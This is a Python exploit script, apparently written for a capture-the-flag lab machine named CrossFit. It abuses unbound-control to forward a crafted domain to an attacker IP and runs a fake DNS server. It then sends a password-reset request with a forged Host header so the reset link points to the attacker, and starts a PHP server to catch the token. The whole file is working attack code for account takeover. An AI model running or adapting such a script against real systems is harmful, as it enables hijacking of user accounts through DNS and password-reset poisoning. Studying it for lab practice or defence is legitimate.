from re import findall
from time import sleep
from subprocess import Popen, PIPE, STDOUT
from os import system
import requests as r

websocket = "ws://gym.crossfit.htb/ws/"
url = "http://employees.crossfit.htb/password-reset.php"
def req_token():
    data = {"email": "david.palmer@crossfit.htb"}
    headers = {"Connection": "keep-alive", "Host": "employeesXcrossfit.htb/employees.crossfit.htb"}
    rspn = r.post(url, data=data, headers=headers)
    alert = findall(r'role="alert">(.*?)<button', rspn.text)[0]
    return alert


fakedns = "/home/x00tex/git-tools/FakeDns/fakedns.py"
conf = "fakedns.conf"

# system('unbound-control -c ./unbound.conf -s 10.10.10.232 forward_add +i ex-employees.crossfit.htb 10.10.15.71')
system('unbound-control -c ./unbound.conf -s 10.10.10.232 forward_add +i employeesXcrossfit.htb 10.10.15.71')
out = Popen(['python', f'{fakedns}', '-c', f'{conf}'], stdout=PIPE, stderr=STDOUT)

sleep(5)
rspn = req_token()
print(rspn)
if "Reset link sent" in rspn:
    system("sudo php -S 0.0.0.0:80")
else:
    out.kill()
    exit()